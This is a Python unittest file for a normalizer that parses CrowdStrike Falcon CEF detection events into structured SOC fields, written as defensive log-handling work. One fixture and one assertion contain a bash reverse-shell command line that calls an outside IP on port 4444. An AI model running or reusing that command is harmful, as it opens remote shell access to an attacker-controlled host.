import unittest

from normalizer import normalize


CEF_REVERSE_SHELL = (
    "CEF:0|CrowdStrike|FalconHost|1.0|EppDetectionSummaryEvent|"
    "EppDetectionSummaryEvent|70|"
    "externalId=82cbc83af15b46daa02afa032564fd41 "
    "cn2Label=ProcessId cn2=1794995223006786560 "
    "cn1Label=ParentProcessId cn1=1794995223004079360 "
    "dhost=ubuntu2402-soclab duser=root "
    "msg=Bash has created an interactive terminal for a remote host. "
    "Check the process tree to determine if malicious commands were executed "
    "and if this access was expected. "
    "fname=bash filePath=/usr/bin/bash "
    "cs5Label=CommandLine "
    "cs5=bash -c bash -i >& /dev/tcp/198.51.100.1/4444 0>&1 "
    "fileHash=303330f9f1b6617b3b533e4dcfe1faf0 "
    "cs6Label=FalconHostLink "
    "cs6=https://falcon.us-2.crowdstrike.com/detections/123?_cid\\=tenant "
    "rt=1794995288000 tactic=Command and Control "
    "technique=Remote Access Tools objective=Contact Controlled Systems "
    "patternDisposition=Detection, prevented. outcome=272"
)

CEF_CRITICAL = (
    "CEF:0|CrowdStrike|FalconHost|1.0|EppDetectionSummaryEvent|"
    "EppDetectionSummaryEvent|90|"
    "externalId=82cbc83af15b46daa02afa032564fd41 "
    "dhost=ubuntu2402-soclab duser=root "
    "msg=A critical level detection was triggered for testing. "
    "fname=bash filePath=/usr/bin/bash "
    "cs5Label=CommandLine cs5=bash -c echo crowdstrike_test_critical "
    "fileHash=303330f9f1b6617b3b533e4dcfe1faf0 "
    "rt=1794997344000 tactic=Falcon Overwatch "
    "technique=Malicious Activity objective=Falcon Detection Method "
    "outcome=0"
)


class CrowdStrikeNormalizerTests(unittest.TestCase):
    def test_normalizes_cef_message_and_labeled_extension_fields(self):
        result = normalize("crowdstrike-events", {"message": CEF_REVERSE_SHELL})

        self.assertEqual(result["data_source"], "crowdstrike")
        self.assertEqual(result["event"]["severity"], 4)
        self.assertTrue(
            result["event"]["action"].startswith(
                "Bash has created an interactive terminal"
            )
        )
        self.assertEqual(result["event"]["outcome"], "alert")
        self.assertEqual(result["event"]["outcome_code"], "272")
        self.assertEqual(result["host"]["name"], "ubuntu2402-soclab")
        self.assertEqual(result["user"]["name"], "root")
        self.assertEqual(result["process"]["pid"], "1794995223006786560")
        self.assertEqual(result["process"]["parent"]["pid"], "1794995223004079360")
        self.assertEqual(
            result["process"]["command_line"],
            "bash -c bash -i >& /dev/tcp/198.51.100.1/4444 0>&1",
        )
        self.assertEqual(result["file"]["hash"]["md5"], "303330f9f1b6617b3b533e4dcfe1faf0")
        self.assertEqual(result["threat"]["technique"], "Remote Access Tools")
        self.assertEqual(result["threat"]["objective"], "Contact Controlled Systems")
        self.assertTrue(result["crowdstrike"]["falcon_host_link"].endswith("?_cid=tenant"))
        self.assertTrue(result["@timestamp"].endswith("Z"))

    def test_maps_critical_cef_severity(self):
        result = normalize("crowdstrike", {"message": CEF_CRITICAL})

        self.assertEqual(result["event"]["severity"], 5)
        self.assertEqual(result["threat"]["tactic"], "Falcon Overwatch")
        self.assertEqual(result["threat"]["technique"], "Malicious Activity")
        self.assertEqual(result["threat"]["objective"], "Falcon Detection Method")

    def test_autodetects_cef_without_source_name(self):
        result = normalize("incoming-events", {"message": CEF_CRITICAL})

        self.assertEqual(result["data_source"], "crowdstrike")
        self.assertEqual(result["host"]["name"], "ubuntu2402-soclab")

    def test_reads_cef_string_from_data_field(self):
        result = normalize("crowdstrike", {"data": CEF_CRITICAL})

        self.assertEqual(result["event"]["severity"], 5)
        self.assertEqual(result["host"]["name"], "ubuntu2402-soclab")

    def test_extracts_cef_after_syslog_prefix_in_full_log(self):
        full_log = "Nov 19 12:00:00 hids-soclab " + CEF_CRITICAL
        result = normalize("crowdstrike", {"full_log": full_log})

        self.assertEqual(result["data_source"], "crowdstrike")
        self.assertEqual(result["event"]["severity"], 5)
        self.assertEqual(result["host"]["name"], "ubuntu2402-soclab")
        self.assertEqual(result["threat"]["tactic"], "Falcon Overwatch")

    def test_severity_zero_maps_to_informational(self):
        cef = CEF_CRITICAL.replace("|1.0|EppDetectionSummaryEvent|", "|1.0|InfoEvent|")
        cef = cef.replace("EppDetectionSummaryEvent|90|", "InfoEvent|0|")
        result = normalize("crowdstrike", {"message": cef})

        self.assertEqual(result["event"]["severity"], 1)


if __name__ == "__main__":
    unittest.main()
